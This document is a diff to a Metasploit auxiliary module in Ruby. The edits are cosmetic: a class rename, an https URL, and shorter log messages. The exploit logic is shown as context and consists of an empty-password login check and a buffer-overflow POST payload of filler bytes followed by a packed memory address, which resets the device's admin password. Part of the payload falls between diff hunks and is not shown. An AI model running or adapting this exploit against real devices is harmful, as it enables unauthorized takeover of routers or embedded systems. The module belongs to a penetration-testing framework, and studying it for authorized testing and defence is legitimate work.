@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -20,8 +17,8 @@ class Metasploit3 < Msf::Auxiliary
       },
       'Author'          =>
         [
-          'Craig Heffner',  #vulnerability discovery and original exploit
-          'Michael Messner <devnull[at]s3cur1ty.de>'  #metasploit module
+          'Craig Heffner',  # vulnerability discovery and original exploit
+          'Michael Messner <devnull[at]s3cur1ty.de>'  # metasploit module
         ],
       'License'         => MSF_LICENSE,
       'References'      =>
@@ -34,20 +31,20 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def check_login(user)
-    print_status("#{peer} - Trying to login with #{user} and empty password")
+    print_status("Trying to login with #{user} and empty password")
     res = send_request_cgi({
       'uri'     => '/',
       'method'  => 'GET',
       'authorization' => basic_auth(user,"")
     })
     if res.nil? || res.code == 404
-      print_status("#{peer} - No login possible with #{user} and empty password")
+      print_status("No login possible with #{user} and empty password")
       return false
     elsif [200, 301, 302].include?(res.code)
-      print_good("#{peer} - Successful login #{user} and empty password")
+      print_good("Successful login #{user} and empty password")
       return true
     else
-      print_status("#{peer} - No login possible with #{user} and empty password")
+      print_status("No login possible with #{user} and empty password")
       return false
     end
   end
@@ -56,15 +53,15 @@ class Metasploit3 < Msf::Auxiliary
 
     begin
       if check_login("admin")
-        print_good("#{peer} - login with user admin and no password possible. There is no need to use this module.")
+        print_good("login with user admin and no password possible. There is no need to use this module.")
         return
       end
     rescue ::Rex::ConnectionError
-      print_error("#{peer} - Failed to connect to the web server")
+      print_error("Failed to connect to the web server")
       return
     end
 
-    print_status("#{peer} - Resetting password for the admin user ...")
+    print_status("Resetting password for the admin user ...")
 
     postdata = Rex::Text.rand_text_alpha(246)             # Filler
     postdata << [0x81544AF0].pack("N")                    # $s0, address of admin password in memory
@@ -94,15 +91,15 @@ class Metasploit3 < Msf::Auxiliary
         })
       if res and res.code == 500
         if check_login("admin")
-          print_good("#{peer} - Expected answer and the login was successful. Try to login with the user admin and a blank password")
+          print_good("Expected answer and the login was successful. Try to login with the user admin and a blank password")
         else
-          print_status("#{peer} - Expected answer, but unknown exploit status. Try to login with the user admin and a blank password")
+          print_status("Expected answer, but unknown exploit status. Try to login with the user admin and a blank password")
         end
       else
-        print_error("#{peer} - Unexpected answer. Exploit attempt has failed")
+        print_error("Unexpected answer. Exploit attempt has failed")
       end
     rescue ::Rex::ConnectionError
-      print_error("#{peer} - Failed to connect to the web server")
+      print_error("Failed to connect to the web server")
       return
     end
   end
